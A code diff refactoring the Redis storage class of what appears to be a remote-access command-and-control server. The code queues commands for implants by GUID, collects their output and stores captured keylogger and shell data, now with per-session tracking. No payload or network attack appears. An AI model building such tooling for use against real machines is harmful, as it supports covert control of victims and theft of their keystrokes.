@@ -31,14 +31,14 @@ class RedisQuery:
 
     def init_redis(self):
         try:
-            self.conn = redis.StrictRedis(host=self.config.get('redis-host'),port=int(self.config.get('redis-port')), db=0)
+            self.conn = redis.StrictRedis(host=self.config.get('redis-host'), port=int(self.config.get('redis-port')), db=0)
             self.set_last_id()
         except:
             UI.error('Failed to connect to the redis instance', True)
 
     def set_last_id(self):
         id = self.get_data('shell:id')
-        if id == None:
+        if id is None:
             self.set_key('shell:id', 1)
 
     def set_key(self, key, value):
@@ -72,13 +72,17 @@ class RedisQuery:
     def get_last_checkin(self, guid):
         return self.get_data('%s:active' % guid)
 
-    def push_cmd(self,guid,cmd,cmd_guid,origin,):
+    def push_cmd(self, guid, cmd, cmd_guid, origin,):
         timestamp = str(time.time())
-        self.mysql.push_cmd_data(cmd_guid, cmd)
-        for session in self.mysql.get_active_session(guid):
-            self.mysql.add_cmd(guid, cmd_guid, session, timestamp,origin)
+        for session in self.get_active_session(guid):
+            session = session.split(":")
+            session_uid = session[0]
+            session_id = session[2]
+            cmds = "%s:%s" % (origin, cmd)
+            self.set_key("%s:session_cmd:%s" % (session_uid, session_id), cmds)
         data = '%s:%s' % (cmd_guid, cmd)
         self.set_key('%s:cmd:%s' % (guid, timestamp), data)
+
 
     def get_cmd(self, guid):
         data = list(self.scan_data('%s:cmd:*' % guid))
@@ -89,16 +93,20 @@ class RedisQuery:
             return data
         return None
 
-    def push_output(self,guid,output,cmd_guid,):
+    def push_output(self, guid, output, cmd_guid,):
         timestamp = str(time.time())
-        for session in self.mysql.get_active_session(guid):
-            self.mysql.add_response(guid, cmd_guid, session, timestamp)
-        self.set_key('%s:%s:output:%s' % (guid, cmd_guid, timestamp),output)
+        for session in self.get_active_session(guid):
+            session = session.split(":")
+            session_uid = session[0]
+            session_id = session[2]
+            self.conn.append("%s:session_output:%s" % (session_uid, session_id), output)
+        self.set_key('%s:%s:output:%s' % (guid, cmd_guid, timestamp), output)
 
     def get_output(self, guid, cmd_guid):
         data = []
         for item in self.scan_data('%s:%s:output:*' % (guid, cmd_guid)):
             data.append(self.get_data(item))
+            self.delete_entry(item)
             return data
         return []
 
@@ -127,7 +135,7 @@ class RedisQuery:
         data = base64.b64decode(data)
         return self.conn.append("%s:keylogger" % guid, "%s" % data)
 
-    def get_keylogger(self, guid):
+    def get_keylogger_data(self, guid):
         return self.get_data("%s:keylogger" % guid)
 
     def append_shell_data(self, guid, data):
@@ -135,3 +143,30 @@ class RedisQuery:
 
     def get_shell_data(self, guid):
         return self.get_data("%s:shell-data" % guid)
+
+    def add_active_user(self, uid, id):
+        return self.set_key("%s:session:%s" % (uid, id), "active")
+
+    def remove_active_user(self, uid, id):
+        return self.delete_entry("%s:session:%s" % (uid, id))
+
+    def get_active_session(self, id):
+        return self.scan_data("*:session:%s" % id)
+
+    def get_active_cli_session_cmd(self, guid):
+        return self.scan_data("%s:session_cmd:*" % guid)
+
+    def get_active_cli_session_output(self, guid):
+        return self.scan_data("%s:session_output:*" % guid)
+
+    def get_active_gui_session_cmd(self, guid, id):
+        return self.scan_data("%s:session_cmd:%s" % (guid, id))
+
+    def get_active_gui_session_output(self, guid, id):
+        return self.scan_data("%s:session_output:%s" % (guid, id))
+
+    def get_session_cmd(self, key):
+        return self.get_data(key)
+
+    def get_session_output(self, key):
+        return self.get_data(key)
